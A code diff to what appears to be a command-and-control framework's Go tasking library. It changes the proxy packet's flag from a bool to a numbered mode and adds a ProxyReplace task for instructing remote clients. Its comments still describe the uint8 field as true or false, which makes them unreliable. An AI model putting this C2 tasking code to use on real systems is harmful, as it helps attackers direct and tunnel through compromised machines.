@@ -341,13 +341,13 @@ func Pull(url, path string) *com.Packet {
 //
 //  Input:
 //      string // Proxy Name (may be empty)
-//      bool   // Always set to true for this task.
+//      uint8  // Always set to true for this task.
 //  Output:
 //      <none>
 func ProxyRemove(name string) *com.Packet {
 	n := &com.Packet{ID: MvProxy}
 	n.WriteString(name)
-	n.WriteBool(true)
+	n.WriteUint8(0)
 	return n
 }
 
@@ -463,7 +463,7 @@ func Delete(s string, recurse bool) *com.Packet {
 //
 //  Input:
 //      string // Proxy Name (may be empty)
-//      bool   // Always set to false for this task.
+//      uint8  // Always set to false for this task.
 //      string // Proxy Bind Address
 //      []byte // Proxy Profile
 //  Output:
@@ -471,7 +471,7 @@ func Delete(s string, recurse bool) *com.Packet {
 func Proxy(name, addr string, p []byte) *com.Packet {
 	n := &com.Packet{ID: MvProxy}
 	n.WriteString(name)
-	n.WriteBool(false)
+	n.WriteUint8(2)
 	n.WriteString(addr)
 	n.WriteBytes(p)
 	return n
@@ -504,6 +504,32 @@ func UploadFile(dst, src string) (*com.Packet, error) {
 	n, err := UploadReader(dst, f)
 	f.Close()
 	return n, err
+}
+
+// ProxyReplace returns an replace Proxy Packet. This can be used to instruct
+// the client to attempt to call the 'Replace' function on the specified Proxy
+// with the name, bind address and Profile bytes as the arguments.
+//
+// Returns an error if Proxy support is disabled, a listen/setup error occurs or
+// the name already is in use.
+//
+// C2 Details:
+//  ID: MvProxy
+//
+//  Input:
+//      string // Proxy Name (may be empty)
+//      uint8  // Always set to false for this task.
+//      string // Proxy Bind Address
+//      []byte // Proxy Profile
+//  Output:
+//      <none>
+func ProxyReplace(name, addr string, p []byte) *com.Packet {
+	n := &com.Packet{ID: MvProxy}
+	n.WriteString(name)
+	n.WriteUint8(1)
+	n.WriteString(addr)
+	n.WriteBytes(p)
+	return n
 }
 
 // UploadReader returns a upload Packet. This will instruct the client to write
